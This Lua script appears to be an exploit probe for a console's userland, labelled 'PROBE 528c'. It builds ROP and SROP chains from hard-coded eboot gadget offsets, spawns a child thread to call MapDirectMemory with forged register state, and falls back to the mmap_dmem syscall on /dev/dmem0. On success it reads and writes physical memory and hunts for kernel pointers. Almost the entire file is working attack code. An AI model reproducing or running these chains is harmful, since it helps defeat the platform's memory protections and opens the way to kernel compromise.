-- CRASH_CLASS: MODERATE
-- PROBE 528c: MapDirectMemory via child thread + SROP
--
-- Problem: MapDirectMemory needs 7 args. fcall controls 6 regs (rdi..r9).
-- 528b's ROP chain can't set r8/r9 (no pop_r8/r9 gadgets in eboot).
-- Running SROP from main thread corrupts Lua's C stack on return.
--
-- Solution: spawn a child thread (thr_new 455) whose entry is a tiny ROP
-- chain that calls getcontext → patches all registers → sigreturn.
-- sigreturn restores the CPU state to call MapDirectMemory with perfect
-- args (all 7 including r8=physAddr, r9=align, 7th on stack).
-- Child writes result to shared memory and exits. Main thread never
-- leaves Lua.
--
-- Strategy:
--   [A] AllocateDirectMemory via fcall (known working)
--   [B] Child thread SROP → MapDirectMemory wrapper (flag sweep)
--   [C] If B fails: child SROP → raw syscall 628 (mmap_dmem)
--   [D] If mapped, read/write physical memory

print("=== PROBE 528c: MAP DIRECT MEMORY (child SROP) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS + SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- ============================================================
-- Get eboot base (handle 0)
-- ============================================================
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- ============================================================
-- Get libkernel base (handle 0x2001, fallback scan)
-- ============================================================
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    print("handle 0x2001 empty, scanning 0-0x100...")
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                print(string.format("  found libkernel at h=0x%X", h))
                break
            end
        end
    end
end

if lk_lo == 0 and lk_hi == 0 then
    print("FAIL: libkernel not found"); return
end
print(string.format("libkernel_text=0x%X%08X", lk_hi, lk_lo))
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local function lkaddr(off) return lk_text + uint64(off) end

-- ============================================================
-- Gadgets (verified in 271g/384b/128g)
-- ============================================================
local G = {
    pop_rax  = 0x992,      -- 58 C3
    pop_rdi  = 0xC9DFE,    -- 5F C3 (alt: 0x75DFE)
    pop_rsi  = 0xD77D,     -- 5E C3
    pop_rdx  = 0x3B02D7,   -- 5A C3
    pop_rcx  = 0xE64,      -- 59 C3
    mov_m    = 0x92C67,     -- 48 89 07 C3 = mov [rdi], rax; ret
    bare_ret = 0x42,        -- C3
}

-- Verify key gadgets
print("")
print("verifying gadgets...")
local function vg(name, off, expect, nb)
    local d = rd(N(eboot) + off)
    if d == nil then print("  " .. name .. ": UNREADABLE"); return false end
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, nb - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    if (d % (mask + 1)) ~= expect then
        print(string.format("  %s: MISMATCH got=0x%X want=0x%X", name, d % (mask + 1), expect))
        return false
    end
    return true
end

local gok = true
gok = vg("pop_rax", G.pop_rax, 0xC358, 2) and gok
gok = vg("pop_rdi", G.pop_rdi, 0xC35F, 2) and gok
gok = vg("pop_rsi", G.pop_rsi, 0xC35E, 2) and gok
gok = vg("pop_rdx", G.pop_rdx, 0xC35A, 2) and gok
gok = vg("pop_rcx", G.pop_rcx, 0xC359, 2) and gok
gok = vg("mov_m", G.mov_m, 0xC3078948, 4) and gok
gok = vg("bare_ret", G.bare_ret, 0xC3, 1) and gok

if not gok then
    -- Try alternate pop_rdi
    if vg("pop_rdi_alt", 0x75DFE, 0xC35F, 2) then
        G.pop_rdi = 0x75DFE
        print("  using alt pop_rdi=0x75DFE")
        gok = true
    else
        print("FAIL: gadgets broken"); return
    end
end
print("  gadgets OK")

if not alive() then print("DIED verifying gadgets"); return end

-- ============================================================
-- SROP from main thread (for simple syscalls — pattern from 141b)
-- ============================================================
-- mcontext_t layout at ucontext+0x40:
--   +0x08=rdi +0x10=rsi +0x18=rdx +0x20=r10 +0x28=r8 +0x30=r9
--   +0x38=rax +0x40=rbx +0x48=rbp +0x50=rcx
--   +0xA0=rip +0xB8=rsp
local MC = 0x40
local sc_gc = mk(421)
local sc_sr = mk(417)
local ctx = memory.alloc(0x500)

-- Capture RIP of the syscall instruction
pcall(function() return sc_gc(uint64(ctx)) end)
local rip_val = rq(N(ctx) + MC + 0xA0)
if not rip_val then print("FAIL: getcontext"); return end
local rh, rl = get_hi_lo(rip_val)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("syscall_addr=" .. fmt(sc_addr))

-- SROP helper for syscalls from main thread
-- Uses r10 for arg4 (syscall ABI), not rcx
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(N(ctx) + MC + 0xA0, sc_addr)
    wq(N(ctx) + MC + 0x38, uint64(num))  -- rax
    if a1 then wq(N(ctx) + MC + 0x08, a1) end  -- rdi
    if a2 then wq(N(ctx) + MC + 0x10, a2) end  -- rsi
    if a3 then wq(N(ctx) + MC + 0x18, a3) end  -- rdx
    if a4 then wq(N(ctx) + MC + 0x20, a4) end  -- r10 (syscall arg4)
    if a5 then wq(N(ctx) + MC + 0x28, a5) end  -- r8
    if a6 then wq(N(ctx) + MC + 0x30, a6) end  -- r9
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if ok then return rv end
    return nil
end

-- Verify SROP
local srop_pid = srop(20)
print("SROP getpid=" .. (srop_pid and tostring(N(srop_pid)) or "FAIL"))
if not srop_pid or N(srop_pid) ~= pid then
    print("SROP BROKEN"); return
end
print("SROP verified OK")

-- ============================================================
-- [A] AllocateDirectMemory
-- ============================================================
print("")
print("[A] sceKernelAllocateDirectMemory")

local alloc_fn = lkaddr(0x17EF0)
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))

-- GetDirectMemorySize returns 0x150000000; DEM9N101 got phys at 0x110010000+
-- searchEnd must cover the full range, not just 256MB
local ok_a, alloc_rv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)

if not ok_a then print("  CRASHED"); return end
print("  ret=" .. N(alloc_rv))
local phys_addr = rq(N(phys_out))
print("  phys=" .. fmt(phys_addr))

if not phys_addr or N(alloc_rv) ~= 0 then
    print("  FAILED"); return
end
local ph, pl = get_hi_lo(phys_addr)
if ph < 0 then ph = ph + 0x100000000 end
if pl < 0 then pl = pl + 0x100000000 end
if ph == 0 and pl < 0x1000 then
    print("  phys looks zero"); return
end
print("  ALLOCATED OK")

if not alive() then print("DIED after alloc"); return end

-- ============================================================
-- [B] MapDirectMemory via child thread + SROP
-- ============================================================
-- The child thread does:
--   1. ROP: sysarch(SET_FSBASE=129, &tcb) for errno safety
--   2. ROP: getcontext(421, &ucontext) to capture a valid signal frame
--   3. ROP: patch the ucontext with MapDirectMemory args + sigreturn trigger
--   4. ROP: sigreturn(417, &ucontext) → kernel restores all regs
--   5. CPU executes MapDirectMemory with all 7 args
--   6. MapDirectMemory returns to... where?
--
-- PROBLEM: after sigreturn, the CPU state is fully replaced. There's no
-- "return to ROP chain". MapDirectMemory's "ret" pops [RSP] which we
-- control via the ucontext's mc_rsp.
--
-- SOLUTION: We set mc_rsp to a mini stack where:
--   [RSP+0]  = return address → address of another sigreturn SROP frame
--   [RSP+8]  = 7th arg (name = NULL)
-- After MapDirectMemory returns, we land on a second ROP chain that
-- stores rax (return value) to shared memory, then does thr_exit.
--
-- SIMPLER SOLUTION: We set mc_rsp so that MapDirectMemory's "ret" pops
-- a return address that goes to: pop_rdi; ret → &result → mov [rdi],rax;ret
-- → pop_rax; ret → 431 → syscall;ret (thr_exit).
-- This is a plain ROP epilogue after the function returns.

print("")
print("[B] MapDirectMemory via child SROP (flag sweep)")

local sc455 = mk(455)
local sc_mmap = mk(477)

-- Shared memory for results
local shared = memory.alloc(0x100)
z(shared, 0x100)
-- shared+0x00: MapDirectMemory return value
-- shared+0x08: virt_out (mapped VA)
-- shared+0x10: done flag (child sets to 0xDEAD when finished)
-- shared+0x18: getcontext RIP (for debugging)
-- shared+0x20: diagnostic (child's TID)

local map_ok = false
local mapped_va = nil
local map_fn = lkaddr(0x15020)

local flag_list = {0, 0x10, 0x12, 1, 2, 0x100, 0x412, 0x1000, 0x10002, 0x40000}

for fi, flags in ipairs(flag_list) do
    if not alive() then
        print("  PROCESS DIED before attempt"); return
    end

    -- Reset shared memory
    z(shared, 0x40)

    -- virt_out for this attempt
    local virt_out = memory.alloc(8)
    wq(N(virt_out), uint64(0))

    -- Child stack (2 MiB)
    local cstack = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not cstack or N(cstack) == 0 then
        print("  mmap for child stack failed"); return
    end

    -- Fake TCB (4KB self-referencing)
    local tcb = memory.alloc(0x1000)
    z(tcb, 0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(N(tcb)))

    -- ucontext buffer: use memory.alloc (Lua heap), NOT child stack.
    -- 528d confirmed this pattern works for child SROP.
    local uctx = memory.alloc(0x500)
    local uctx_addr = N(uctx)
    z(uctx_addr, 0x500)

    -- Post-MapDirectMemory epilogue: a ROP chain the function returns to.
    -- Placed after the ucontext buffer in the child's stack.
    -- When MapDirectMemory does "ret", RSP pops [RSP+0] = first gadget.
    -- Chain: store rax to shared, set done flag, thr_exit.
    local epi_off = 0x2000
    local epi_addr = N(cstack) + epi_off
    z(epi_addr, 0x200)
    local ep = epi_addr
    local function ewq(v) wq(ep, v); ep = ep + 8 end

    -- After MapDirectMemory returns, rax = return value
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(N(shared)))       -- rdi = &shared[0]
    ewq(eaddr(G.mov_m))          -- shared[0] = rax (map return value)

    -- Store 0xDEAD as done flag at shared+0x10
    ewq(eaddr(G.pop_rax))
    ewq(uint64(0xDEAD))
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(N(shared) + 0x10))
    ewq(eaddr(G.mov_m))          -- shared[0x10] = 0xDEAD

    -- thr_exit(431)
    ewq(eaddr(G.pop_rax))
    ewq(uint64(431))
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(0))
    ewq(stub)                     -- syscall;ret

    -- The MapDirectMemory fake stack:
    -- When sigreturn sets RSP, the function enters with:
    --   [RSP+0] = return address (→ epilogue ROP chain)
    --   [RSP+8] = 7th argument (name = NULL)
    local fn_stack_off = 0x3000
    local fn_stack_addr = N(cstack) + fn_stack_off
    -- Align: after "call" the stack is at 16N+8. We simulate post-call:
    -- fn_stack_addr must be ≡ 8 (mod 16)
    -- cstack is page-aligned, so cstack + 0x3000 is page-aligned (16N).
    -- We want 16N + 8 for post-call alignment.
    local fn_rsp = fn_stack_addr + 8  -- now ≡ 8 (mod 16)
    wq(fn_rsp, uint64(epi_addr))       -- [RSP+0] = return to epilogue
    wq(fn_rsp + 8, uint64(0))          -- [RSP+8] = 7th arg: name = NULL

    -- Build the child's primary ROP chain
    -- Entry: bare_ret → chain starts executing
    local chain_off = 0x100000  -- 1 MiB into the 2 MiB stack
    local chain_base = N(cstack) + chain_off + 8  -- +8 so chain_base ≡ 8 (mod 16)
    local pos = chain_base

    local function emit(v) wq(pos, v); pos = pos + 8 end

    -- Step 1: sysarch(SET_FSBASE=129, &tcb_ptr)
    emit(eaddr(G.pop_rax)); emit(uint64(165))    -- rax = sysarch
    emit(eaddr(G.pop_rdi)); emit(uint64(129))    -- rdi = SET_FSBASE
    emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
    emit(stub)                                     -- syscall;ret

    -- Step 2: getcontext(421, &uctx) via raw syscall
    emit(eaddr(G.pop_rax)); emit(uint64(421))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
    emit(stub)                                     -- syscall;ret

    -- Step 2b: Write diagnostic — child reached post-getcontext
    -- Store 0xBEEF at shared+0x20 to confirm getcontext completed
    emit(eaddr(G.pop_rax)); emit(uint64(0xBEEF))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x20))
    emit(eaddr(G.mov_m))

    -- Step 3: After getcontext returns, we need to patch the ucontext
    -- and then call sigreturn. But we can't "patch" from ROP easily
    -- because mov [rdi],rax only writes ONE qword at a time, and we
    -- need to write ~8 fields.
    --
    -- Approach: pre-fill the ucontext with all the MapDirectMemory values
    -- BEFORE spawning the child. getcontext will OVERWRITE some fields
    -- (rip, rsp, rbp, rax, etc.), so we patch those back after getcontext.
    -- But from ROP, after getcontext, we only have mov [rdi],rax;ret
    -- (one store per pair of gadgets).
    --
    -- Fields getcontext changes that we need to override:
    --   mc_rip (+0xA0) → MapDirectMemory address
    --   mc_rsp (+0xB8) → fn_rsp
    --   mc_rdi (+0x08) → &virt_out
    --   mc_rsi (+0x10) → 0x4000
    --   mc_rdx (+0x18) → 3
    --   mc_rcx (+0x50) → flags
    --   mc_r8  (+0x28) → physAddr
    --   mc_r9  (+0x30) → 0x4000
    --   mc_rax (+0x38) → doesn't matter for function call
    --
    -- That's 8 writes. 8 × (pop_rax + value + pop_rdi + addr + mov_m) =
    -- 8 × 5 = 40 qwords = 320 bytes. Fits easily.
    --
    -- Pre-fill the fields that getcontext WON'T touch (or that we'll override anyway):

    -- mc_rip: write via ROP
    emit(eaddr(G.pop_rax)); emit(map_fn)                     -- rax = MapDirectMemory
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0xA0))
    emit(eaddr(G.mov_m))                                      -- mc_rip = MapDirectMemory

    -- mc_rsp: the stack MapDirectMemory will use
    emit(eaddr(G.pop_rax)); emit(uint64(fn_rsp))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0xB8))
    emit(eaddr(G.mov_m))                                      -- mc_rsp = fn_rsp

    -- mc_rdi = &virt_out
    emit(eaddr(G.pop_rax)); emit(uint64(N(virt_out)))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x08))
    emit(eaddr(G.mov_m))

    -- mc_rsi = 0x4000 (len)
    emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x10))
    emit(eaddr(G.mov_m))

    -- mc_rdx = 3 (PROT_READ|PROT_WRITE)
    emit(eaddr(G.pop_rax)); emit(uint64(3))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x18))
    emit(eaddr(G.mov_m))

    -- mc_rcx = flags (for C ABI — wrapper reads rcx, not r10)
    emit(eaddr(G.pop_rax)); emit(uint64(flags))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x50))
    emit(eaddr(G.mov_m))

    -- mc_r8 = physAddr
    emit(eaddr(G.pop_rax)); emit(phys_addr)
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x28))
    emit(eaddr(G.mov_m))

    -- mc_r9 = 0x4000 (alignment)
    emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x30))
    emit(eaddr(G.mov_m))

    -- Step 4: sigreturn(417, &uctx) → kernel loads all patched regs
    -- → CPU jumps to MapDirectMemory with perfect state
    emit(eaddr(G.pop_rax)); emit(uint64(417))    -- rax = sigreturn
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
    emit(stub)                                     -- syscall;ret → sigreturn

    -- (sigreturn does not return here — CPU state is replaced.
    --  MapDirectMemory's "ret" goes to the epilogue chain at epi_addr.)

    local chain_len = pos - chain_base
    print(string.format("  [%d] flags=0x%X chain=%d bytes", fi, flags, chain_len))

    -- thr_new(455): RSP = ((stack_base + stack_size) & ~0xF) - 8
    -- chain_base = cstack + chain_off + 8 (ends ...0008)
    -- Need RSP = chain_base → chain_base + 8 = cstack + chain_off + 0x10 (ends ...0010)
    -- (cstack + sz) & ~0xF = cstack + chain_off + 0x10 → sz = chain_off + 0x10
    -- Check: (cstack + 0x100010) & ~0xF = cstack + 0x100010 ✓ ; - 8 = chain_base ✓
    local child_stack_sz = chain_off + 0x10

    local param = memory.alloc(0x40)
    z(param, 0x40)
    wq(N(param) + 0x00, eaddr(G.bare_ret))       -- start_func
    wq(N(param) + 0x08, uint64(0))                -- arg (unused)
    wq(N(param) + 0x10, cstack)                   -- stack_base
    wq(N(param) + 0x18, uint64(child_stack_sz))   -- stack_size
    local tid_p = memory.alloc(8)
    wq(N(tid_p), uint64(0))
    wq(N(param) + 0x30, uint64(N(tid_p)))         -- child_tid

    -- Launch child
    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t or (ret_t and N(ret_t) ~= 0) then
        print(string.format("  thr_new failed: ok=%s rv=%s", tostring(ok_t),
            ret_t and tostring(N(ret_t)) or "nil"))
        -- Continue to next flag
    else
        -- Wait for child to finish (spin on done flag)
        local timeout = 0
        local done = false
        while timeout < 500000 do
            local flag = rq(N(shared) + 0x10)
            if flag and N(flag) == 0xDEAD then
                done = true
                break
            end
            timeout = timeout + 1
            -- Busy-wait (Lua doesn't have sleep)
            local x = 0; for k = 1, 100 do x = x + k end
        end

        if not alive() then
            print(string.format("  flags=0x%X: PROCESS KILLED", flags))
            return
        end

        local child_tid = rq(N(tid_p))
        local rv_raw = rq(N(shared))
        local va = rq(N(virt_out))
        local diag_gc = rq(N(shared) + 0x20)  -- 0xBEEF if getcontext completed
        print(string.format("  diag: tid=%s gc=%s done=%s",
            fmt(child_tid), fmt(diag_gc), tostring(done)))

        if done then
            local rv = rv_raw and N(rv_raw) or -1
            print(string.format("  flags=0x%X: rv=%d va=%s done=YES",
                flags, rv, fmt(va)))

            if rv == 0 and va then
                local vah, val_ = get_hi_lo(va)
                if vah < 0 then vah = vah + 0x100000000 end
                if val_ < 0 then val_ = val_ + 0x100000000 end
                if vah ~= 0 or val_ > 0x1000 then
                    print("  *** MAPPING SUCCESS! ***")
                    map_ok = true
                    mapped_va = va
                    break
                end
            end
        else
            print(string.format("  flags=0x%X: TIMEOUT tid=%s rv=%s va=%s",
                flags, fmt(child_tid), fmt(rv_raw), fmt(va)))
        end
    end
end

-- ============================================================
-- [C] Fallback: raw syscall 628 (mmap_dmem) via main-thread SROP
-- ============================================================
if not map_ok and alive() then
    print("")
    print("[C] mmap_dmem(628) via main-thread SROP")

    -- Open /dev/dmem0
    local devpath = memory.alloc(0x20)
    local dname = "/dev/dmem0"
    for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
    wd(N(devpath) + #dname, 0)
    local ok_o, dmem_fd = pcall(function()
        return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
    end)
    local fd_val = ok_o and N(dmem_fd) or -1
    print("  dmem0 fd=" .. fd_val)

    if fd_val >= 0 then
        -- mmap_dmem(628): addr, len, prot, flags, fd, physOff
        local shapes = {
            {0, 0x4000, 3, 1, fd_val, phys_addr},
            {0, 0x4000, 3, 0x40, fd_val, phys_addr},
            {0, 0x4000, 3, 0x41, fd_val, phys_addr},
            {0, 0x4000, 3, 1, fd_val, uint64(0)},
            {0, 0x4000, 3, 0, 0xFFFFFFFF, phys_addr},
            {0, 0x4000, 3, 1, 0xFFFFFFFF, phys_addr},
        }

        for si, s in ipairs(shapes) do
            local rv628 = srop(628,
                uint64(s[1]), uint64(s[2]), uint64(s[3]),
                uint64(s[4]), uint64(s[5]),
                type(s[6]) == "table" and s[6] or uint64(s[6]))

            if not alive() then
                print(string.format("  shape %d: KILLED", si)); return
            end

            if rv628 then
                local rvh, rvl = get_hi_lo(rv628)
                if rvh < 0 then rvh = rvh + 0x100000000 end
                if rvl < 0 then rvl = rvl + 0x100000000 end
                print(string.format("  shape %d: rv=%s", si, fmt(rv628)))

                if rvh ~= 0xFFFFFFFF and (rvh ~= 0 or rvl > 0x1000) then
                    print("  *** mmap_dmem SUCCESS! ***")
                    map_ok = true
                    mapped_va = rv628
                    break
                end
            else
                print(string.format("  shape %d: nil", si))
            end
        end

        pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_val)) end)
    end
end

-- ============================================================
-- [D] Read/write mapped physical memory
-- ============================================================
if map_ok and mapped_va then
    print("")
    print("[D] READING MAPPED PHYSICAL MEMORY")
    print("  VA=" .. fmt(mapped_va))

    for i = 0, 15 do
        local v = rq(N(mapped_va) + i * 8)
        if v then
            local line = string.format("  [+0x%02X] = %s", i * 8, fmt(v))
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if vh >= 0xFFFF8000 then
                local exp = math.floor(vh / 0x100000) % 0x800
                if exp ~= 0x7FF then
                    line = line .. " *** KERNEL PTR? ***"
                end
            end
            print(line)
        else
            print(string.format("  [+0x%02X] = FAULT", i * 8))
        end
    end

    print("")
    print("  write test...")
    local magic = 0xCAFEBABE
    wd(N(mapped_va), magic)
    local readback = rd(N(mapped_va))
    print(string.format("  wrote=0x%X read=0x%X match=%s",
        magic, readback or 0, tostring(readback == magic)))
end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  phys=" .. fmt(phys_addr))
if map_ok then
    print("  MAP OK va=" .. fmt(mapped_va))
    print("  *** PHYSICAL MEMORY R/W ACHIEVED ***")
else
    print("  MAP FAILED")
end
print("  alive=" .. tostring(alive()))
print("=== 528c COMPLETE ===")
